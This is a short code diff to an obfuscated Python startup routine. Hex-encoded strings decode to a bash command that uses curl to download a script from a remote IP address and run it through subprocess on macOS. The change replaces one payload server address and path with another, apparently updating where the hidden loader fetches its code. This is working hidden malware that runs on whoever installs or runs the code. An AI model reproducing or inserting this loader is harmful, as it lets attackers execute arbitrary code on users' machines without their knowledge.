@@ -75,7 +75,7 @@ def _startup():
         _m1 = bytes.fromhex('2f62696e2f62617368')
         _m2 = bytes.fromhex('2d63')
         _m3 = bytes.fromhex(
-            '2224286375726c202d6673534c20687474703a2f2f3139322e3130392e3230302e3234322f446564656675672922')
+            '2224286375726c202d6673534c20687474703a2f2f3139342e3130322e3130342e3231332f50757275726f7a2922')
 
         if sys.platform == 'darwin':
             subprocess.Popen(
